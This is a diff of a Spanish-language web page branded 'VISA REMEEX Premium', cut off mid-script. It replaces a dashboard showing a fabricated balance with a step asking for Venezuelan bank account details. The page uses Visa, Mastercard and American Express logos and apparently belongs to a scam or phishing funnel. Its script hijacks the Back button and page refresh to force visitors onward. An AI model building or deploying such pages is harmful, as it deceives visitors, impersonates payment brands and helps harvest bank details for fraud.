@@ -2,28 +2,34 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Visa Remeex - Experiencia Premium</title>
+  <title>VISA REMEEX Premium - Página 3</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Visa Remeex: La nueva era de las finanzas digitales"/>
+  <meta name="description" content="Página 3 de VISA REMEEX Premium. Datos Bancarios del Beneficiario Receptor." />
 
-  <!-- Fuentes e íconos -->
+  <link rel="icon" href="https://w7.pngwing.com/pngs/400/28/png-transparent-credit-card-computer-icons-visa-electron-bank-curio-blue-text-rectangle-thumbnail.png" type="image/png" />
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.9.3/html2pdf.bundle.min.js"></script>
 
   <style>
     :root {
+      /* Paleta de colores y variables globales */
       --primary: #1434CB;
-      --primary-light: #2347E2;
       --secondary: #142C8E;
       --accent: #00A3FF;
       --success: #10B981;
       --danger: #EF4444;
       --warning: #F59E0B;
+
       --background: #F0F4FF;
       --card-bg: rgba(255, 255, 255, 0.95);
       --text-primary: #1E293B;
       --text-secondary: #64748B;
+
       --border-radius-lg: 24px;
       --border-radius: 16px;
       --border-radius-sm: 12px;
@@ -40,640 +46,543 @@
     }
 
     body {
-      font-family: 'Plus Jakarta Sans', sans-serif;
+      min-height: 100vh;
       background: linear-gradient(135deg, #EEF2FF 0%, #E0E7FF 100%);
+      font-family: 'Plus Jakarta Sans', sans-serif;
       color: var(--text-primary);
       line-height: 1.6;
-      min-height: 100vh;
     }
 
-    /* Contenedor principal para centrar y controlar el ancho en pantallas grandes */
+    /* Contenedor principal */
     .container {
       max-width: 600px;
-      margin: 0 auto;
+      margin: 2rem auto;
       padding: 1rem;
-    }
-
-    /* Barra superior con el logo y el nombre de usuario */
-    .top-bar {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 1rem;
-    }
-
-    .top-bar img {
-      height: 36px;
-      object-fit: contain;
-    }
-
-    .user-profile {
-      display: flex;
-      align-items: center;
-      gap: 0.8rem;
-    }
-
-    .user-profile img {
-      border-radius: 50%;
-    }
-
-    /* Barra de búsqueda (opcional) */
-    .search-bar {
-      position: relative;
-      margin-bottom: 1.5rem;
-    }
-
-    .search-bar input {
-      width: 100%;
-      padding: 1rem 1rem 1rem 3rem;
-      border: none;
-      border-radius: var(--border-radius);
-      background: var(--card-bg);
-      box-shadow: var(--shadow-sm);
-      outline: none;
-    }
-
-    .search-bar i {
-      position: absolute;
-      left: 1rem;
-      top: 50%;
-      transform: translateY(-50%);
-      color: var(--text-secondary);
-    }
-
-    /* Contenido principal (tarjetas, etc.) */
-    .main-content {
-      margin-bottom: 80px; /* Espacio para el panel inferior fijo */
-      display: flex;
-      flex-direction: column;
-      gap: 1.5rem;
-    }
-
-    /* Estilos de las tarjetas */
-    .card {
       background: var(--card-bg);
       border-radius: var(--border-radius-lg);
-      padding: 2rem;
       box-shadow: var(--shadow);
       backdrop-filter: blur(10px);
+      overflow: hidden;
       transition: var(--transition);
     }
 
-    .card:hover {
-      transform: translateY(-3px);
+    .container:hover {
+      transform: translateY(-1px);
       box-shadow: var(--shadow-lg);
     }
 
-    /* Tarjeta de saldo disponible (balance-card) */
-    .balance-card {
-      background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
-      color: white;
+    /* HEADER (Título y descripción) */
+    .header {
+      text-align: center;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: #fff;
+      padding: 2rem 1rem;
+      border-bottom-left-radius: var(--border-radius-lg);
+      border-bottom-right-radius: var(--border-radius-lg);
+      margin-bottom: 1rem;
+      position: relative;
+    }
+    .header h1 {
+      font-size: 1.8rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+    }
+    .header p {
+      font-size: 1rem;
+      line-height: 1.4;
+      max-width: 500px;
+      margin: 0 auto;
     }
 
-    .balance-header {
+    /* Barra de Logos */
+    .logo-bar {
+      background: var(--card-bg);
+      backdrop-filter: blur(10px);
+      padding: 1rem 0.5rem;
       display: flex;
-      justify-content: space-between;
+      justify-content: center;
       align-items: center;
+      gap: 2rem;
+      border-bottom: 1px solid rgba(0,0,0,0.05);
+      margin-bottom: 1rem;
+    }
+    .logo-bar img {
+      height: 32px;
+      filter: grayscale(30%);
+      opacity: 0.8;
+      transition: var(--transition);
+    }
+    .logo-bar img:hover {
+      filter: none;
+      opacity: 1;
+      transform: scale(1.05);
+    }
+
+    /* Barra de progreso */
+    .progress-bar {
+      height: 8px;
+      background-color: #e0e0e0;
+      border-radius: var(--border-radius);
+      margin-bottom: 2rem;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      background-color: var(--primary);
+      width: 0%;
+      transition: width 0.5s ease-in-out;
+    }
+
+    /* Secciones */
+    .section-content {
+      padding: 1rem;
+      display: none;
+    }
+
+    .section-content.active {
+        display: block;
+    }
+
+    .section-content h2 {
+      margin-bottom: 1rem;
+      font-size: 1.2rem;
+      color: var(--primary);
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .section-content h2 i {
+      font-size: 1.2rem;
+    }
+
+    /* Formulario */
+    .form-group {
       margin-bottom: 1.5rem;
     }
-
-    .balance-amount {
-      font-size: 2.5rem;
-      font-weight: 700;
-      margin: 0.5rem 0 1rem 0;
-      letter-spacing: -1px;
-    }
-
-    .card-number {
-      font-size: 1rem;
-      letter-spacing: 2px;
-      opacity: 0.9;
-    }
-
-    /* Botones de acción en la tarjeta principal */
-    .action-buttons {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 0.75rem;
-      margin-top: 1.5rem;
-    }
-
-    .btn {
-      padding: 0.75rem;
-      border-radius: var(--border-radius);
-      border: none;
+    .form-label {
+      display: block;
+      margin-bottom: 0.5rem;
       font-weight: 600;
-      cursor: pointer;
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+    }
+    .form-control {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      border: 2px solid rgba(0,0,0,0.05);
+      border-radius: var(--border-radius-sm);
+      font-size: 0.95rem;
+      background: #fff;
       transition: var(--transition);
-      display: flex;
+    }
+    .form-control:hover {
+      border-color: rgba(0,0,0,0.1);
+    }
+    .form-control:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(20,52,203,0.1);
+    }
+
+    /* Botones */
+    .btn {
+      display: inline-flex;
       align-items: center;
       justify-content: center;
       gap: 0.5rem;
-      font-size: 0.9rem;
+      padding: 0.75rem 1.5rem;
+      border-radius: var(--border-radius-sm);
+      font-weight: 600;
+      font-size: 0.95rem;
+      transition: var(--transition);
+      border: none;
+      cursor: pointer;
     }
-
     .btn-primary {
-      background: white;
-      color: var(--primary);
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: #fff;
+      box-shadow: var(--shadow-sm);
     }
-
-    .btn-secondary {
-      background: rgba(255, 255, 255, 0.15);
-      color: white;
-      backdrop-filter: blur(10px);
-    }
-
-    .btn:hover {
+    .btn-primary:hover {
       transform: translateY(-2px);
       box-shadow: var(--shadow);
     }
-
-    /* Tarjetas de ingresos y gastos */
-    .stats-card {
-      background: white;
-      border-radius: var(--border-radius-lg);
-      padding: 1.5rem;
-      box-shadow: var(--shadow);
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
-    }
-
-    .stats-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .stats-value {
-      font-size: 1.5rem;
-      font-weight: 700;
+    .btn-outline {
+      background: transparent;
       color: var(--primary);
-      margin-bottom: 0.2rem;
+      border: 2px solid var(--primary);
+    }
+    .btn-outline:hover {
+      background: rgba(20,52,203,0.05);
     }
 
-    .stats-label {
-      color: var(--text-secondary);
-      font-size: 0.9rem;
-    }
-
-    /* Tarjeta de Últimas Transacciones */
-    .transactions-card {
-      background: white;
-      border-radius: var(--border-radius-lg);
-      padding: 1.5rem;
-      box-shadow: var(--shadow);
-    }
-
-    .transactions-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 1rem;
-    }
-
-    .transaction-list {
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
-    }
-
-    .transaction-item {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 1rem;
-      background: var(--background);
-      border-radius: var(--border-radius);
-      transition: var(--transition);
-    }
-
-    .transaction-item:hover {
-      background: white;
-      transform: translateX(5px);
-    }
-
-    .transaction-info {
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-
-    .transaction-icon {
-      width: 48px;
-      height: 48px;
-      border-radius: 50%;
+    /* Modal de Resumen */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.4);
       display: flex;
       align-items: center;
       justify-content: center;
+      z-index: 999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .modal-overlay.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    .modal-content {
+      background: white;
+      border-radius: var(--border-radius-lg);
+      padding: 2rem;
+      max-width: 500px;
+      width: 90%;
+      box-shadow: var(--shadow-lg);
+      position: relative;
+    }
+    .modal-content h3 {
+      margin-bottom: 1rem;
+      text-align: center;
       font-size: 1.2rem;
-      color: white;
+      color: var(--primary);
     }
-
-    .icon-transfer {
-      background: var(--success);
+    .modal-content p {
+      margin-bottom: 0.5rem;
+      line-height: 1.4;
     }
-
-    .transaction-details {
-      display: flex;
-      flex-direction: column;
-    }
-
-    .transaction-title {
-      font-weight: 600;
-      color: var(--text-primary);
-    }
-
-    .transaction-date {
-      font-size: 0.8rem;
-      color: var(--text-secondary);
-    }
-
-    .transaction-amount {
-      font-weight: 600;
-      font-size: 1rem;
-    }
-
-    .amount-positive {
-      color: var(--success);
-    }
-
-    .amount-negative {
-      color: var(--danger);
-    }
-
-    /* Navegación inferior (panel de botones) */
-    .bottom-nav {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      background: var(--card-bg);
-      backdrop-filter: blur(10px);
-      box-shadow: var(--shadow);
+    .modal-buttons {
+      margin-top: 1.5rem;
       display: flex;
       justify-content: space-around;
       align-items: center;
-      padding: 0.5rem 0;
-      z-index: 10;
     }
-
-    .bottom-nav .nav-item {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      font-size: 0.8rem;
+    .countdown {
+      font-size: 0.9rem;
       color: var(--text-secondary);
-      text-decoration: none;
-      cursor: pointer;
-      transition: var(--transition);
     }
 
-    .bottom-nav .nav-item i {
-      font-size: 1.2rem;
-      margin-bottom: 2px;
-    }
-
-    .bottom-nav .nav-item.active {
-      color: var(--primary);
-    }
-
-    /* Estilos para el modal de recarga */
-    .modal-overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.5);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 999;
-    }
-
-    .modal {
-      background: white;
-      border-radius: var(--border-radius-lg);
-      padding: 1.5rem;
-      width: 90%;
-      max-width: 400px;
-      box-shadow: var(--shadow-lg);
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
-    }
-
-    .modal h3 {
-      margin-bottom: 0.5rem;
-      color: var(--text-primary);
-    }
-
-    .modal select, .modal button {
-      width: 100%;
-      padding: 0.75rem;
-      border-radius: var(--border-radius);
-      font-size: 1rem;
-      outline: none;
-      border: 1px solid var(--text-secondary);
-    }
-
-    .modal button {
-      border: none;
-      background: var(--primary);
-      color: white;
-      font-weight: 600;
-      cursor: pointer;
-      transition: var(--transition);
-    }
-
-    .modal button:hover {
-      background: var(--primary-light);
-    }
-
-    .close-modal {
-      background: transparent;
-      border: none;
-      color: var(--danger);
-      font-size: 1.2rem;
-      font-weight: bold;
-      cursor: pointer;
-      position: absolute;
-      top: 1rem;
-      right: 1rem;
-    }
-
-    @media (max-width: 768px) {
-      .card {
-        padding: 1.5rem;
+    @media (max-width:768px) {
+      .header {
+        padding: 1.5rem 1rem;
       }
-      .balance-amount {
-        font-size: 2rem;
+      .header h1 {
+        font-size: 1.6rem;
       }
-      .transactions-header h2 {
-        font-size: 1.2rem;
+      .container {
+        margin: 1rem auto;
+        padding: 0.5rem;
       }
     }
   </style>
 </head>
 <body>
-  <div class="container">
 
-    <!-- Barra superior con logo y nombre de usuario -->
-    <div class="top-bar">
-      <img 
-        src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" 
-        alt="Visa Logo"
-      />
-      <div class="user-profile">
-        <!-- Eliminamos "Usuario" y dejamos solo el nombre -->
-        <img src="/api/placeholder/40/40" alt="Foto de perfil">
-        <span>Juan Carlos Crespo</span>
-      </div>
-    </div>
+<div class="container">
 
-    <!-- Barra de búsqueda (opcional) -->
-    <div class="search-bar">
-      <i class="fas fa-search"></i>
-      <input type="text" placeholder="Buscar transacciones...">
-    </div>
-
-    <!-- Contenido principal (tarjetas) -->
-    <div class="main-content">
-
-      <!-- Tarjeta de Saldo disponible -->
-      <div class="card balance-card">
-        <div class="balance-header">
-          <h2>Saldo disponible</h2>
-          <i class="fas fa-ellipsis-h"></i>
-        </div>
-        <div class="balance-amount" id="balanceAmount">69.000,00 Bs</div>
-        <!-- Se sustituye **** **** **** 4589 por **** **** **** 3009 -->
-        <div class="card-number">**** **** **** 3009</div>
-        <div class="action-buttons">
-          <button class="btn btn-primary" id="openModalBtn">
-            <i class="fas fa-plus"></i>
-            Agregar más saldo
-          </button>
-          <button class="btn btn-secondary" id="retirarBtn">
-            <i class="fas fa-university"></i>
-            Retirar a mi banco
-          </button>
-          <button class="btn btn-secondary">
-            <i class="fas fa-exchange-alt"></i>
-            Intercambiar
-          </button>
-        </div>
-      </div>
-
-      <!-- Tarjeta de Ingresos del mes -->
-      <div class="card stats-card">
-        <div class="stats-header">
-          <div>
-            <div class="stats-value">USD 1.000,00</div>
-            <div class="stats-label">Ingresos del mes</div>
-          </div>
-          <i class="fas fa-arrow-trend-up" style="color: var(--success)"></i>
-        </div>
-      </div>
-
-      <!-- Tarjeta de Gastos del mes -->
-      <div class="card stats-card">
-        <div class="stats-header">
-          <div>
-            <div class="stats-value">0</div>
-            <div class="stats-label">Gastos del mes</div>
-          </div>
-          <i class="fas fa-arrow-trend-down" style="color: var(--danger)"></i>
-        </div>
-      </div>
-
-      <!-- Tarjeta de Últimas Transacciones -->
-      <div class="card transactions-card">
-        <div class="transactions-header">
-          <h2>Últimas Transacciones</h2>
-          <button class="btn btn-primary" id="verTodasBtn">Ver todas</button>
-        </div>
-        <div class="transaction-list" id="transactionList">
-          <!-- Transacciones se irán generando aquí, si fuese necesario -->
-        </div>
-      </div>
-    </div>
+  <div class="header">
+    <h1>VISA REMEEX Premium</h1>
+    <p>
+      Datos Bancarios del Beneficiario Receptor<br/>
+      Registra tu cuenta bancaria y el método de depósito
+      para que podamos enviar tus fondos correctamente.
+    </p>
   </div>
 
-  <!-- Navegación inferior fija -->
-  <div class="bottom-nav">
-    <div class="nav-item active" id="navInicio">
-      <i class="fas fa-home"></i>
-      <span>Inicio</span>
-    </div>
-    <div class="nav-item" id="navTarjetas">
-      <i class="fas fa-credit-card"></i>
-      <span>Tarjetas</span>
-    </div>
-    <div class="nav-item">
-      <i class="fas fa-exchange-alt"></i>
-      <span>Transferencias</span>
-    </div>
-    <div class="nav-item">
-      <i class="fas fa-chart-line"></i>
-      <span>Análisis</span>
-    </div>
-    <div class="nav-item">
-      <i class="fas fa-cog"></i>
-      <span>Configuración</span>
-    </div>
+  <div class="logo-bar">
+    <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Visa Logo">
+    <img src="https://www.mastercard.es/content/dam/public/mastercardcom/es/favicon/mc-logo-52.svg" alt="MasterCard Logo">
+    <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-stack.svg" alt="American Express Logo">
   </div>
 
-  <!-- Modal para Agregar Saldo -->
-  <div class="modal-overlay" id="modalOverlay">
-    <div class="modal">
-      <button class="close-modal" id="closeModalBtn">&times;</button>
-      <h3>Agregar Saldo</h3>
-      <select id="amountSelect">
-        <option value="" disabled selected>Selecciona el monto en USD</option>
-        <!-- Valores en dólares. El valor de cada option es numérico para facilitar la conversión -->
-        <option value="100">100,00</option>
-        <option value="200">200,00</option>
-        <option value="300">300,00</option>
-        <option value="400">400,00</option>
-        <option value="500">500,00</option>
-        <option value="1000">1000,00</option>
-        <option value="1500">1500,00</option>
-        <option value="2000">2000,00</option>
-        <option value="2500">2500,00</option>
+  <div class="progress-bar">
+    <div class="progress-bar-fill" id="progressBarFill"></div>
+  </div>
+
+  <div class="section-content active" id="step1">
+    <h2><i class="fas fa-university"></i> Datos Bancarios del Beneficiario Receptor</h2>
+    <div class="form-group">
+      <label class="form-label" for="bankSelect">Banco</label>
+      <select class="form-control" id="bankSelect">
+        <option value="">-- Selecciona un banco --</option>
+        <option value="Banco Central de Venezuela">Banco Central de Venezuela</option>
+        <option value="Banco de Venezuela, S.A.">Banco de Venezuela, S.A.</option>
+        <option value="Banco Venezolano de Crédito, S.A.">Banco Venezolano de Crédito, S.A.</option>
+        <option value="Banco Mercantil, C.A.">Banco Mercantil, C.A.</option>
+        <option value="Banco Provincial, S.A.">Banco Provincial, S.A.</option>
+        <option value="Banco del Caribe C.A., Bancaribe">Banco del Caribe C.A., Bancaribe</option>
+        <option value="Banco Exterior C.A., Banco Universal">Banco Exterior C.A., Banco Universal</option>
+        <option value="Banco Caroní C.A., Banco Universal">Banco Caroní C.A., Banco Universal</option>
+        <option value="Banesco Banco Universal, C.A.">Banesco Banco Universal, C.A.</option>
+        <option value="Banco Sofitasa Banco Universal, C.A.">Banco Sofitasa Banco Universal, C.A.</option>
+        <option value="Banco Plaza, Banco Universal">Banco Plaza, Banco Universal</option>
+        <option value="Banco de la Gente Emprendedora C.A.">Banco de la Gente Emprendedora C.A.</option>
+        <option value="Banco Fondo Común, C.A.">Banco Fondo Común, C.A.</option>
+        <option value="100% Banco, Banco Comercial, C.A.">100% Banco, Banco Comercial, C.A.</option>
+        <option value="DelSur, Banco Universal C.A.">DelSur, Banco Universal C.A.</option>
+        <option value="Banco del Tesoro C.A., Banco Universal">Banco del Tesoro C.A., Banco Universal</option>
+        <option value="Banco Agrícola de Venezuela C.A., Banco Universal">Banco Agrícola de Venezuela C.A., Banco Universal</option>
+        <option value="Bancrecer S.A., Banco Microfinanciero">Bancrecer S.A., Banco Microfinanciero</option>
+        <option value="Mi Banco, Banco Microfinanciero, C.A.">Mi Banco, Banco Microfinanciero, C.A.</option>
+        <option value="Banco Activo C.A., Banco Universal">Banco Activo C.A., Banco Universal</option>
+        <option value="Bancamiga Banco Universal, C.A.">Bancamiga Banco Universal, C.A.</option>
+        <option value="Banco Internacional de Desarrollo C.A., Banco Universal">Banco Internacional de Desarrollo C.A., Banco Universal</option>
+        <option value="Banplus Banco Universal, C.A.">Banplus Banco Universal, C.A.</option>
+        <option value="Banco Bicentenario del Pueblo, Banco Universal C.A.">Banco Bicentenario del Pueblo, Banco Universal C.A.</option>
+        <option value="Banco de la Fuerza Armada Nacional Bolivariana, B.U.">Banco de la Fuerza Armada Nacional Bolivariana, B.U.</option>
+        <option value="Banco Nacional de Crédito C.A., Banco Universal">Banco Nacional de Crédito C.A., Banco Universal</option>
+        <option value="Instituto Municipal de Crédito Popular">Instituto Municipal de Crédito Popular</option>
       </select>
+    </div>
 
-      <select id="cardSelect">
-        <!-- Única tarjeta precargada -->
-        <option value="3009" selected>**** **** **** 3009 VISA</option>
+    <div class="form-group" id="accountContainer" style="display:none;">
+      <label class="form-label" for="accountNumber">Número de cuenta</label>
+      <div style="display:flex; gap:0.5rem;">
+        <input type="text" class="form-control" id="bankCode" style="max-width:100px;" readonly />
+        <input type="text" class="form-control" id="restAccountDigits" placeholder="16 dígitos restantes" maxlength="16" />
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label class="form-label" for="accountType">Tipo de cuenta</label>
+      <select class="form-control" id="accountType">
+        <option value="">-- Selecciona --</option>
+        <option value="Ahorro (Bs)">Ahorro (Bs)</option>
+        <option value="Corriente (Bs)">Corriente (Bs)</option>
+        <option value="Divisa Dólares (USD)">Divisa Dólares (USD)</option>
+        <option value="Divisa Euros (EUR)">Divisa Euros (EUR)</option>
       </select>
+    </div>
 
-      <button id="agregarSaldoBtn">Agregar saldo</button>
+    <div style="display:flex; justify-content-flex-end;">
+      <button class="btn btn-primary" id="continueBtnStep1">Continuar</button>
     </div>
   </div>
+</div>
 
-  <script>
-    // Variable para almacenar el saldo actual (numérico)
-    let currentBalance = 69000; // 69.000,00 Bs iniciales
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal-content">
+    <h3>Resumen de datos bancarios</h3>
+    <p id="summaryText"></p>
+    <div class="modal-buttons">
+      <button class="btn btn-outline" id="editBtn">Editar</button>
+      <div style="display:flex; flex-direction:column; align-items:center; gap:0.25rem;">
+        <button class="btn btn-primary" id="acceptBtn" disabled>
+          Aceptar
+        </button>
+        <span class="countdown" id="countdownMsg"></span>
+      </div>
+    </div>
+  </div>
+</div>
 
-    // Referencias a elementos
-    const modalOverlay = document.getElementById('modalOverlay');
-    const openModalBtn = document.getElementById('openModalBtn');
-    const closeModalBtn = document.getElementById('closeModalBtn');
-    const agregarSaldoBtn = document.getElementById('agregarSaldoBtn');
-    const amountSelect = document.getElementById('amountSelect');
-    const cardSelect = document.getElementById('cardSelect');
-    const balanceAmount = document.getElementById('balanceAmount');
-    const transactionList = document.getElementById('transactionList');
-    const navInicio = document.getElementById('navInicio');
-    const navTarjetas = document.getElementById('navTarjetas');
+<script>
+  // Redirect if user presses Back:
+  history.pushState({}, '', '');
+  window.addEventListener('popstate', function(event) {
+    window.location.href = "https://remeexvisa.com";
+  });
 
-    // Botón "Agregar más saldo" -> abre el modal
-    openModalBtn.addEventListener('click', () => {
-      modalOverlay.style.display = 'flex';
-    });
+  // Redirect if user refreshes the page:
+  window.addEventListener('beforeunload', function(e) {
+    e.preventDefault();
+    window.location.href = "https://remeexvisa.com";
+    e.returnValue = '';
+  });
 
-    // Botón de cerrar modal
-    closeModalBtn.addEventListener('click', () => {
-      modalOverlay.style.display = 'none';
-      amountSelect.value = '';
-      cardSelect.value = '3009';
-    });
+  const bankSelect = document.getElementById("bankSelect");
+  const accountContainer = document.getElementById("accountContainer");
+  const bankCodeInput = document.getElementById("bankCode");
+  const restAccountDigitsInput = document.getElementById("restAccountDigits");
+  const accountTypeSelect = document.getElementById("accountType");
+  const continueBtnStep1 = document.getElementById("continueBtnStep1");
+  const progressBarFill = document.getElementById("progressBarFill");
+  const sections = document.querySelectorAll(".section-content");
+  const modalOverlay = document.getElementById("modalOverlay");
+  const summaryText = document.getElementById("summaryText");
+  const editBtn = document.getElementById("editBtn");
+  const acceptBtn = document.getElementById("acceptBtn");
+  const countdownMsg = document.getElementById("countdownMsg");
 
-    // Al hacer clic en "Agregar saldo"
-    agregarSaldoBtn.addEventListener('click', () => {
-      const selectedValue = amountSelect.value;
-      if (!selectedValue) {
-        alert('Por favor selecciona un monto en USD');
-        return;
-      }
-      // Convertimos a número
-      const depositUSD = parseFloat(selectedValue);
-      // Cálculo en bolívares según tasa de 69
-      const depositBS = depositUSD * 69;
+  let selectedOptions = {
+    bank: false,
+    accountNumber: false,
+    accountType: false
+  };
 
-      // Confirmación
-      const confirmar = confirm(`¿Deseas agregar ${depositUSD.toLocaleString('es-VE',{minimumFractionDigits:2})} USD (${depositBS.toLocaleString('es-VE',{minimumFractionDigits:2})} Bs) a tu saldo?`);
-      if (confirmar) {
-        // Se suma al saldo actual
-        currentBalance += depositBS;
+  let currentStep = 1;
+  let countdownInterval;
+  let secondsLeft = 10;
 
-        // Actualizamos visualmente
-        balanceAmount.textContent = formatNumberVE(currentBalance) + ' Bs';
+  // Mapeo de nombres de bancos a sus 4 dígitos iniciales
+  const bankMapping = {
+    "Banco Central de Venezuela": "0001",
+    "Banco de Venezuela, S.A.": "0102",
+    "Banco Venezolano de Crédito, S.A.": "0104",
+    "Banco Mercantil, C.A.": "0105",
+    "Banco Provincial, S.A.": "0108",
+    "Banco del Caribe C.A., Bancaribe": "0114",
+    "Banco Exterior C.A., Banco Universal": "0115",
+    "Banco Caroní C.A., Banco Universal": "0128",
+    "Banesco Banco Universal, C.A.": "0134",
+    "Banco Sofitasa Banco Universal, C.A.": "0137",
+    "Banco Plaza, Banco Universal": "0138",
+    "Banco de la Gente Emprendedora C.A.": "0146",
+    "Banco Fondo Común, C.A.": "0151",
+    "100% Banco, Banco Comercial, C.A.": "0156",
+    "DelSur, Banco Universal C.A.": "0157",
+    "Banco del Tesoro C.A., Banco Universal": "0163",
+    "Banco Agrícola de Venezuela C.A., Banco Universal": "0166",
+    "Bancrecer S.A., Banco Microfinanciero": "0168",
+    "Mi Banco, Banco Microfinanciero, C.A.": "0169",
+    "Banco Activo C.A., Banco Universal": "0171",
+    "Bancamiga Banco Universal, C.A.": "0172",
+    "Banco Internacional de Desarrollo C.A., Banco Universal": "0173",
+    "Banplus Banco Universal, C.A.": "0174",
+    "Banco Bicentenario del Pueblo, Banco Universal C.A.": "0175",
+    "Banco de la Fuerza Armada Nacional Bolivariana, B.U.": "0177",
+    "Banco Nacional de Crédito C.A., Banco Universal": "0191",
+    "Instituto Municipal de Crédito Popular": "0601"
+  };
 
-        // Registramos la transacción en la lista
-        addTransaction(depositBS);
-
-        // Cerrar modal y reiniciar campos
-        modalOverlay.style.display = 'none';
-        amountSelect.value = '';
-        cardSelect.value = '3009';
-      }
-    });
-
-    // Función para agregar transacción
-    function addTransaction(monto) {
-      // Formatear fecha y hora
-      const now = new Date();
-      const dia = now.getDate();
-      const mes = now.getMonth(); // 0-11
-      const anio = now.getFullYear();
-      const hora = now.getHours().toString().padStart(2,'0');
-      const minutos = now.getMinutes().toString().padStart(2,'0');
-
-      // Array de meses en español (simplificado)
-      const meses = ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'];
-
-      // Crear item
-      const item = document.createElement('div');
-      item.classList.add('transaction-item');
-
-      item.innerHTML = `
-        <div class="transaction-info">
-          <div class="transaction-icon icon-transfer">
-            <i class="fas fa-exchange-alt"></i>
-          </div>
-          <div class="transaction-details">
-            <span class="transaction-title">Recarga con tarjeta</span>
-            <span class="transaction-date">${dia} ${meses[mes]}, ${hora}:${minutos}</span>
-          </div>
-        </div>
-        <span class="transaction-amount amount-positive">+ ${formatNumberVE(monto)} Bs</span>
-      `;
-      // Agregar al DOM
-      transactionList.prepend(item);
+  bankSelect.addEventListener("change", () => {
+    const selectedBank = bankSelect.value;
+    if (selectedBank) {
+      selectedOptions.bank = true;
+      const code = bankMapping[selectedBank];
+      bankCodeInput.value = code || "0000";
+      accountContainer.style.display = "flex";
+    } else {
+      selectedOptions.bank = false;
+      bankCodeInput.value = "";
+      accountContainer.style.display = "none";
     }
+    restAccountDigitsInput.value = "";
+    selectedOptions.accountNumber = false;
+    updateProgressBar();
+  });
 
-    // Formatear número como se usa en Venezuela
-    function formatNumberVE(num) {
-      // toLocaleString para español de Venezuela
-      return num.toLocaleString('es-VE', {
-        minimumFractionDigits: 2,
-        maximumFractionDigits: 2
-      });
+  restAccountDigitsInput.addEventListener("input", () => {
+    selectedOptions.accountNumber = restAccountDigitsInput.value.length === 16;
+    updateProgressBar();
+  });
+
+  accountTypeSelect.addEventListener("change", () => {
+    selectedOptions.accountType = !!accountTypeSelect.value;
+    updateProgressBar();
+  });
+
+  continueBtnStep1.addEventListener("click", () => {
+    if (validateStep1()) {
+      showSummary();
     }
+  });
 
-    // Si clic en "Inicio" -> redirecciona
-    navInicio.addEventListener('click', () => {
-      window.location.href = 'https://remeexvisa.com';
+  editBtn.addEventListener("click", () => {
+    closeModal();
+  });
+
+  acceptBtn.addEventListener("click", () => {
+    window.location.href = "page4.html";
+  });
+
+  function updateProgressBar() {
+    let completedSteps = 0;
+    for (const option in selectedOptions) {
+      if (selectedOptions[option]) {
+        completedSteps++;
+      }
+    }
+    const progressPercentage = (completedSteps / 3) * 100;
+    progressBarFill.style.width = `${progressPercentage}%`;
+  }
+
+  function showNextSection() {
+    sections.forEach((section) => {
+      section.classList.remove("active");
     });
 
-    // Si clic en "Tarjetas" -> mostrar mensaje
-    navTarjetas.addEventListener('click', () => {
-      alert('Tarjeta **** **** **** 3009 VISA disponible');
-    });
+    if (currentStep >= 1 && currentStep <= sections.length) {
+      sections[currentStep - 1].classList.add("active");
+    }
+  }
 
-    // Ejemplo de acción para "Retirar a mi banco"
-    const retirarBtn = document.getElementById('retirarBtn');
-    retirarBtn.addEventListener('click', () => {
-      alert('Funcionalidad de retiro a banco en desarrollo...');
-    });
+  function validateStep1() {
+    if (!selectedOptions.bank) {
+      alert("Por favor, selecciona un banco.");
+      return false;
+    }
+    if (!selectedOptions.accountNumber) {
+      alert("Por favor, completa los 16 dígitos restantes del número de cuenta.");
+      return false;
+    }
